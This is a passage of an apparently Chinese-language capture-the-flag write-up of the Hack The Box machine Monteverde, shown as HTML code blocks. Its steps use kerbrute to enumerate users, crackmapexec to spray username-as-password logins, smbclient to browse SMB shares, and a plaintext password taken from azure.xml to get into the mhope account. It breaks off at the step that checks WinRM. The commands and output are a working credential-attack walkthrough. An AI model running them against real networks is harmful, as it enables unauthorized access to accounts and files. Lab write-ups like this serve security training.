+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo ntpdate <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span><br>[sudo] kali 的密码：<br><span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-11</span> <span class="hljs-number">15</span>:<span class="hljs-number">48</span>:<span class="hljs-number">55.823244</span> (+<span class="hljs-number">0800</span>) <span class="hljs-number">-28784.200210</span> +/- <span class="hljs-number">0.064667</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span> s1 no-leap<br>CLOCK: time stepped by <span class="hljs-number">-28784.200210</span><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ echo <span class="hljs-string">&quot;10.10.10.172 MEGABANK.LOCAL&quot;</span> | sudo tee -a /etc/hosts<br>[sudo] kali 的密码：<br><span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span> MEGABANK.LOCAL<br><br>┌──(kali㉿offsec)-[~/Desktop/tools]<br>└─$ ./kerbrute userenum -d MEGABANK.LOCAL --dc <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span> ../users   <br><br>    __             __               __     <br>   / /_____  _____/ /_  _______  __/ /____ <br>  / <span class="hljs-comment">//_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \</span><br><span class="hljs-comment"> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/</span><br>/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        <br><br>Version: dev (n/a) - <span class="hljs-number">05</span>/<span class="hljs-number">11</span>/<span class="hljs-number">24</span> - Ronnie Flathers @ropnop<br><br><span class="hljs-number">2024</span>/<span class="hljs-number">05</span>/<span class="hljs-number">11</span> <span class="hljs-number">16</span>:<span class="hljs-number">04</span>:<span class="hljs-number">04</span> &gt;  Using <span class="hljs-title function_">KDC</span><span class="hljs-params">(s)</span>:<br>2024/05/11 16:04:04 &gt;   10.10.10.172:88<br><br>2024/05/11 16:04:04 &gt;  [+] VALID USERNAME:       AAD_987d7f2f57d2@MEGABANK.LOCAL<br>2024/05/11 16:04:04 &gt;  [+] VALID USERNAME:       mhope@MEGABANK.LOCAL<br>2024/05/11 16:04:04 &gt;  [+] VALID USERNAME:       svc-bexec@MEGABANK.LOCAL<br>2024/05/11 16:04:04 &gt;  [+] VALID USERNAME:       svc-netapp@MEGABANK.LOCAL<br>2024/05/11 16:04:04 &gt;  [+] VALID USERNAME:       svc-ata@MEGABANK.LOCAL<br>2024/05/11 16:04:04 &gt;  [+] VALID USERNAME:       smorgan@MEGABANK.LOCAL<br>2024/05/11 16:04:04 &gt;  [+] VALID USERNAME:       SABatchJobs@MEGABANK.LOCAL<br>2024/05/11 16:04:04 &gt;  [+] VALID USERNAME:       roleary@MEGABANK.LOCAL<br>2024/05/11 16:04:04 &gt;  [+] VALID USERNAME:       dgalanos@MEGABANK.LOCAL<br>2024/05/11 16:04:04 &gt;  Done! Tested 10 <span class="hljs-title function_">usernames</span> <span class="hljs-params">(<span class="hljs-number">9</span> valid)</span> in 0.138 seconds<br></code></pre></td></tr></table></figure>
+
+<p>7、发现大部分用户ID都在，只有1个用户账号不在。</p>
+<p>8、下面尝试下密码复用枚举，看看这些密码中是否有弱密码的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ crackmapexec smb <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span> -u ./users  -p users --<span class="hljs-keyword">continue</span>-on-success<br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span>    <span class="hljs-number">445</span>    MONTEVERDE       [*] Windows <span class="hljs-number">10.0</span> Build <span class="hljs-number">17763</span> x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)<br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span>    <span class="hljs-number">445</span>    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:Guest STATUS_LOGON_FAILURE <br>......<br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span>    <span class="hljs-number">445</span>    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:mhope STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span>    <span class="hljs-number">445</span>    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span>    <span class="hljs-number">445</span>    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:svc-ata STATUS_LOGON_FAILURE <br>......<br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span>    <span class="hljs-number">445</span>    MONTEVERDE       [-] MEGABANK.LOCAL\smorgan:smorgan STATUS_LOGON_FAILURE <br></code></pre></td></tr></table></figure>
+
+<p>9、发现了1个，羡慕尝试 winrm 和 smb 协议，看看是否可以登录。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ crackmapexec winrm <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span> -u SABatchJobs -p <span class="hljs-string">&#x27;SABatchJobs&#x27;</span><br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span>    <span class="hljs-number">5985</span>   MONTEVERDE       [*] Windows <span class="hljs-number">10.0</span> Build <span class="hljs-number">17763</span> (name:MONTEVERDE) (domain:MEGABANK.LOCAL)<br>HTTP        <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span>    <span class="hljs-number">5985</span>   MONTEVERDE       [*] http:<span class="hljs-comment">//10.10.10.172:5985/wsman</span><br>WINRM       <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span>    <span class="hljs-number">5985</span>   MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:SABatchJobs<br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ crackmapexec smb <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span> -u SABatchJobs -p SABatchJobs<br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span>    <span class="hljs-number">445</span>    MONTEVERDE       [*] Windows <span class="hljs-number">10.0</span> Build <span class="hljs-number">17763</span> x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)<br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span>    <span class="hljs-number">445</span>    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs <br></code></pre></td></tr></table></figure>
+
+<p>10、只有smb服务可以登录，那就看看有哪些SMB目录可以访问吧</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ smbmap -u SABatchJobs -p SABatchJobs -H <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span> <br><br>    ________  ___      ___  _______   ___      ___       __         _______<br>   /<span class="hljs-string">&quot;       )|&quot;</span>  \    /<span class="hljs-string">&quot;  ||   _  &quot;</span>\ |<span class="hljs-string">&quot;  \    /&quot;</span>  |     /<span class="hljs-string">&quot;&quot;</span>\       |   __ <span class="hljs-string">&quot;\</span><br><span class="hljs-string">  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)</span><br><span class="hljs-string">   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#x27; /\  \     |:  ____/</span><br><span class="hljs-string">    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#x27;  \    (|  /</span><br><span class="hljs-string">   /&quot;</span> \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \<br>  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)<br> -----------------------------------------------------------------------------<br>     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com<br>                     https:<span class="hljs-comment">//github.com/ShawnDEvans/smbmap</span><br><br>[*] Detected <span class="hljs-number">1</span> hosts serving SMB<br>[*] Established <span class="hljs-number">1</span> SMB session(s)                                <br>                                                                                                    <br>[+] IP: <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span>:<span class="hljs-number">445</span>        Name: MEGABANK.LOCAL            Status: Authenticated<br>        Disk                                                    Permissions     Comment<br>        ----                                                    -----------     -------<br>        ADMIN$                                                  NO ACCESS       Remote Admin<br>        azure_uploads                                           READ ONLY<br>        C$                                                      NO ACCESS       Default share<br>        E$                                                      NO ACCESS       Default share<br>        IPC$                                                    READ ONLY       Remote IPC<br>        NETLOGON                                                READ ONLY       Logon server share <br>        SYSVOL                                                  READ ONLY       Logon server share <br>        users$                                                  READ ONLY<br></code></pre></td></tr></table></figure>
+
+<p>11、还是有些目录是可读的，羡慕尝试枚举下看看，有哪些有意思的文件吧</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ smbclient -U SABatchJobs%SABatchJobs \\\\<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span>\\azure_uploads<br>Try <span class="hljs-string">&quot;help&quot;</span> to get a <span class="hljs-built_in">list</span> of possible commands.<br>smb: \&gt; ls<br>  .                                   D        <span class="hljs-number">0</span>  Fri Jan  <span class="hljs-number">3</span> <span class="hljs-number">20</span>:<span class="hljs-number">43</span>:<span class="hljs-number">06</span> <span class="hljs-number">2020</span><br>  ..                                  D        <span class="hljs-number">0</span>  Fri Jan  <span class="hljs-number">3</span> <span class="hljs-number">20</span>:<span class="hljs-number">43</span>:<span class="hljs-number">06</span> <span class="hljs-number">2020</span><br><br>                <span class="hljs-number">31999</span> blocks of size <span class="hljs-number">4096.</span> <span class="hljs-number">28979</span> blocks available<br>smb: \&gt; <span class="hljs-built_in">exit</span><br>                                                                                                                                                                                        <br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ smbclient -U SABatchJobs%SABatchJobs \\\\<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span>\\NETLOGON     <br>Try <span class="hljs-string">&quot;help&quot;</span> to get a <span class="hljs-built_in">list</span> of possible commands.<br>smb: \&gt; ls<br>  .                                   D        <span class="hljs-number">0</span>  Fri Jan  <span class="hljs-number">3</span> <span class="hljs-number">06</span>:<span class="hljs-number">05</span>:<span class="hljs-number">14</span> <span class="hljs-number">2020</span><br>  ..                                  D        <span class="hljs-number">0</span>  Fri Jan  <span class="hljs-number">3</span> <span class="hljs-number">06</span>:<span class="hljs-number">05</span>:<span class="hljs-number">14</span> <span class="hljs-number">2020</span><br><br>                <span class="hljs-number">5024511</span> blocks of size <span class="hljs-number">4096.</span> <span class="hljs-number">803691</span> blocks available<br>smb: \&gt; <span class="hljs-built_in">exit</span><br>                                                                                                                                                                                        <br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ smbclient -U SABatchJobs%SABatchJobs \\\\<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span>\\SYSVOl  <br>Try <span class="hljs-string">&quot;help&quot;</span> to get a <span class="hljs-built_in">list</span> of possible commands.<br>smb: \&gt; ls<br>  .                                   D        <span class="hljs-number">0</span>  Fri Jan  <span class="hljs-number">3</span> <span class="hljs-number">06</span>:<span class="hljs-number">05</span>:<span class="hljs-number">14</span> <span class="hljs-number">2020</span><br>  ..                                  D        <span class="hljs-number">0</span>  Fri Jan  <span class="hljs-number">3</span> <span class="hljs-number">06</span>:<span class="hljs-number">05</span>:<span class="hljs-number">14</span> <span class="hljs-number">2020</span><br>  MEGABANK.LOCAL                     Dr        <span class="hljs-number">0</span>  Fri Jan  <span class="hljs-number">3</span> <span class="hljs-number">06</span>:<span class="hljs-number">05</span>:<span class="hljs-number">14</span> <span class="hljs-number">2020</span><br><br>                <span class="hljs-number">5024511</span> blocks of size <span class="hljs-number">4096.</span> <span class="hljs-number">803691</span> blocks available<br>smb: \&gt; cd MEGABANK.LOCAL<br>smb: \MEGABANK.LOCAL\&gt; ls<br>  .                                   D        <span class="hljs-number">0</span>  Fri Jan  <span class="hljs-number">3</span> <span class="hljs-number">06</span>:<span class="hljs-number">11</span>:<span class="hljs-number">34</span> <span class="hljs-number">2020</span><br>  ..                                  D        <span class="hljs-number">0</span>  Fri Jan  <span class="hljs-number">3</span> <span class="hljs-number">06</span>:<span class="hljs-number">11</span>:<span class="hljs-number">34</span> <span class="hljs-number">2020</span><br>  DfsrPrivate                      DHSr        <span class="hljs-number">0</span>  Fri Jan  <span class="hljs-number">3</span> <span class="hljs-number">06</span>:<span class="hljs-number">11</span>:<span class="hljs-number">34</span> <span class="hljs-number">2020</span><br>  Policies                            D        <span class="hljs-number">0</span>  Fri Jan  <span class="hljs-number">3</span> <span class="hljs-number">06</span>:<span class="hljs-number">05</span>:<span class="hljs-number">22</span> <span class="hljs-number">2020</span><br>  scripts                             D        <span class="hljs-number">0</span>  Fri Jan  <span class="hljs-number">3</span> <span class="hljs-number">06</span>:<span class="hljs-number">05</span>:<span class="hljs-number">14</span> <span class="hljs-number">2020</span><br><br>                <span class="hljs-number">5024511</span> blocks of size <span class="hljs-number">4096.</span> <span class="hljs-number">803691</span> blocks available<br>smb: \MEGABANK.LOCAL\&gt;<span class="hljs-built_in">exit</span><br><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ smbclient -U SABatchJobs%SABatchJobs \\\\<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span>\\users$<br>Try <span class="hljs-string">&quot;help&quot;</span> to get a <span class="hljs-built_in">list</span> of possible commands.<br>smb: \&gt; ls<br>  .                                   D        <span class="hljs-number">0</span>  Fri Jan  <span class="hljs-number">3</span> <span class="hljs-number">21</span>:<span class="hljs-number">12</span>:<span class="hljs-number">48</span> <span class="hljs-number">2020</span><br>  ..                                  D        <span class="hljs-number">0</span>  Fri Jan  <span class="hljs-number">3</span> <span class="hljs-number">21</span>:<span class="hljs-number">12</span>:<span class="hljs-number">48</span> <span class="hljs-number">2020</span><br>  dgalanos                            D        <span class="hljs-number">0</span>  Fri Jan  <span class="hljs-number">3</span> <span class="hljs-number">21</span>:<span class="hljs-number">12</span>:<span class="hljs-number">30</span> <span class="hljs-number">2020</span><br>  mhope                               D        <span class="hljs-number">0</span>  Fri Jan  <span class="hljs-number">3</span> <span class="hljs-number">21</span>:<span class="hljs-number">41</span>:<span class="hljs-number">18</span> <span class="hljs-number">2020</span><br>  roleary                             D        <span class="hljs-number">0</span>  Fri Jan  <span class="hljs-number">3</span> <span class="hljs-number">21</span>:<span class="hljs-number">10</span>:<span class="hljs-number">30</span> <span class="hljs-number">2020</span><br>  smorgan                             D        <span class="hljs-number">0</span>  Fri Jan  <span class="hljs-number">3</span> <span class="hljs-number">21</span>:<span class="hljs-number">10</span>:<span class="hljs-number">24</span> <span class="hljs-number">2020</span><br><br>                <span class="hljs-number">31999</span> blocks of size <span class="hljs-number">4096.</span> <span class="hljs-number">28979</span> blocks available<br>smb: \&gt; <br><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ smbclient -U SABatchJobs%SABatchJobs \\\\<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span>\\users$<br>Try <span class="hljs-string">&quot;help&quot;</span> to get a <span class="hljs-built_in">list</span> of possible commands.<br>smb: \&gt; cd dgalanos<br>smb: \dgalanos\&gt; ls<br>  .                                   D        <span class="hljs-number">0</span>  Fri Jan  <span class="hljs-number">3</span> <span class="hljs-number">21</span>:<span class="hljs-number">12</span>:<span class="hljs-number">30</span> <span class="hljs-number">2020</span><br>  ..                                  D        <span class="hljs-number">0</span>  Fri Jan  <span class="hljs-number">3</span> <span class="hljs-number">21</span>:<span class="hljs-number">12</span>:<span class="hljs-number">30</span> <span class="hljs-number">2020</span><br><br>                <span class="hljs-number">31999</span> blocks of size <span class="hljs-number">4096.</span> <span class="hljs-number">28979</span> blocks available<br>smb: \dgalanos\&gt; cd ../mhope<br>smb: \mhope\&gt; ls<br>  .                                   D        <span class="hljs-number">0</span>  Fri Jan  <span class="hljs-number">3</span> <span class="hljs-number">21</span>:<span class="hljs-number">41</span>:<span class="hljs-number">18</span> <span class="hljs-number">2020</span><br>  ..                                  D        <span class="hljs-number">0</span>  Fri Jan  <span class="hljs-number">3</span> <span class="hljs-number">21</span>:<span class="hljs-number">41</span>:<span class="hljs-number">18</span> <span class="hljs-number">2020</span><br>  azure.xml                          AR     <span class="hljs-number">1212</span>  Fri Jan  <span class="hljs-number">3</span> <span class="hljs-number">21</span>:<span class="hljs-number">40</span>:<span class="hljs-number">23</span> <span class="hljs-number">2020</span><br><br>                <span class="hljs-number">31999</span> blocks of size <span class="hljs-number">4096.</span> <span class="hljs-number">28979</span> blocks available<br>smb: \mhope\&gt; get azure.xml<br>getting file \mhope\azure.xml of size <span class="hljs-number">1212</span> as azure.xml (<span class="hljs-number">2.2</span> KiloBytes/sec) (average <span class="hljs-number">2.2</span> KiloBytes/sec)<br>smb: \mhope\&gt; cd ../roleary<br>smb: \roleary\&gt; ls<br>  .                                   D        <span class="hljs-number">0</span>  Fri Jan  <span class="hljs-number">3</span> <span class="hljs-number">21</span>:<span class="hljs-number">10</span>:<span class="hljs-number">30</span> <span class="hljs-number">2020</span><br>  ..                                  D        <span class="hljs-number">0</span>  Fri Jan  <span class="hljs-number">3</span> <span class="hljs-number">21</span>:<span class="hljs-number">10</span>:<span class="hljs-number">30</span> <span class="hljs-number">2020</span><br><br>                <span class="hljs-number">31999</span> blocks of size <span class="hljs-number">4096.</span> <span class="hljs-number">28979</span> blocks available<br>smb: \roleary\&gt; cd ../smorgan<br>smb: \smorgan\&gt; ls<br>  .                                   D        <span class="hljs-number">0</span>  Fri Jan  <span class="hljs-number">3</span> <span class="hljs-number">21</span>:<span class="hljs-number">10</span>:<span class="hljs-number">24</span> <span class="hljs-number">2020</span><br>  ..                                  D        <span class="hljs-number">0</span>  Fri Jan  <span class="hljs-number">3</span> <span class="hljs-number">21</span>:<span class="hljs-number">10</span>:<span class="hljs-number">24</span> <span class="hljs-number">2020</span><br><br>                <span class="hljs-number">31999</span> blocks of size <span class="hljs-number">4096.</span> <span class="hljs-number">28979</span> blocks available<br>smb: \smorgan\&gt; <span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure>
+
+<p>12、这里发现了一个文件，经过查看，发现里面有个默认密码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ cat azure.xml <br>��&lt;Objs Version=<span class="hljs-string">&quot;1.1.0.1&quot;</span> xmlns=<span class="hljs-string">&quot;http://schemas.microsoft.com/powershell/2004/04&quot;</span>&gt;<br>  &lt;Obj RefId=<span class="hljs-string">&quot;0&quot;</span>&gt;<br>    &lt;TN RefId=<span class="hljs-string">&quot;0&quot;</span>&gt;<br>      &lt;T&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/T&gt;<br>      &lt;T&gt;System.Object&lt;/T&gt;<br>    &lt;/TN&gt;<br>    &lt;ToString&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/ToString&gt;<br>    &lt;Props&gt;<br>      &lt;DT N=<span class="hljs-string">&quot;StartDate&quot;</span>&gt;<span class="hljs-number">2020</span><span class="hljs-number">-01</span><span class="hljs-number">-03</span>T05:<span class="hljs-number">35</span>:<span class="hljs-number">00.7562298</span><span class="hljs-number">-08</span>:<span class="hljs-number">00</span>&lt;/DT&gt;<br>      &lt;DT N=<span class="hljs-string">&quot;EndDate&quot;</span>&gt;<span class="hljs-number">2054</span><span class="hljs-number">-01</span><span class="hljs-number">-03</span>T05:<span class="hljs-number">35</span>:<span class="hljs-number">00.7562298</span><span class="hljs-number">-08</span>:<span class="hljs-number">00</span>&lt;/DT&gt;<br>      &lt;G N=<span class="hljs-string">&quot;KeyId&quot;</span>&gt;<span class="hljs-number">00000000</span><span class="hljs-number">-0000</span><span class="hljs-number">-0000</span><span class="hljs-number">-0000</span><span class="hljs-number">-000000000000</span>&lt;/G&gt;<br>      &lt;S N=<span class="hljs-string">&quot;Password&quot;</span>&gt;<span class="hljs-number">4</span>n0therD4y@n0th3r$&lt;/S&gt;<br>    &lt;/Props&gt;<br>  &lt;/Obj&gt;<br>&lt;/Objs&gt; <br></code></pre></td></tr></table></figure>
+
+<p>13、开始使用该密码进行枚举验证是哪些用户的密码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ crackmapexec smb <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span> -u users -p <span class="hljs-string">&#x27;4n0therD4y@n0th3r$&#x27;</span> --<span class="hljs-keyword">continue</span>-on-success<br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span>    <span class="hljs-number">445</span>    MONTEVERDE       [*] Windows <span class="hljs-number">10.0</span> Build <span class="hljs-number">17763</span> x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)<br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span>    <span class="hljs-number">445</span>    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:<span class="hljs-number">4</span>n0therD4y@n0th3r$ STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span>    <span class="hljs-number">445</span>    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:<span class="hljs-number">4</span>n0therD4y@n0th3r$ STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span>    <span class="hljs-number">445</span>    MONTEVERDE       [+] MEGABANK.LOCAL\mhope:<span class="hljs-number">4</span>n0therD4y@n0th3r$ <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span>    <span class="hljs-number">445</span>    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:<span class="hljs-number">4</span>n0therD4y@n0th3r$ STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span>    <span class="hljs-number">445</span>    MONTEVERDE       [-] MEGABANK.LOCAL\svc-ata:<span class="hljs-number">4</span>n0therD4y@n0th3r$ STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span>    <span class="hljs-number">445</span>    MONTEVERDE       [-] MEGABANK.LOCAL\svc-bexec:<span class="hljs-number">4</span>n0therD4y@n0th3r$ STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span>    <span class="hljs-number">445</span>    MONTEVERDE       [-] MEGABANK.LOCAL\svc-netapp:<span class="hljs-number">4</span>n0therD4y@n0th3r$ STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span>    <span class="hljs-number">445</span>    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:<span class="hljs-number">4</span>n0therD4y@n0th3r$ STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span>    <span class="hljs-number">445</span>    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:<span class="hljs-number">4</span>n0therD4y@n0th3r$ STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span>    <span class="hljs-number">445</span>    MONTEVERDE       [-] MEGABANK.LOCAL\smorgan:<span class="hljs-number">4</span>n0therD4y@n0th3r$ STATUS_LOGON_FAILURE <br></code></pre></td></tr></table></figure>
+
+<p>14、查看该用户是否可以winrm协议</p>
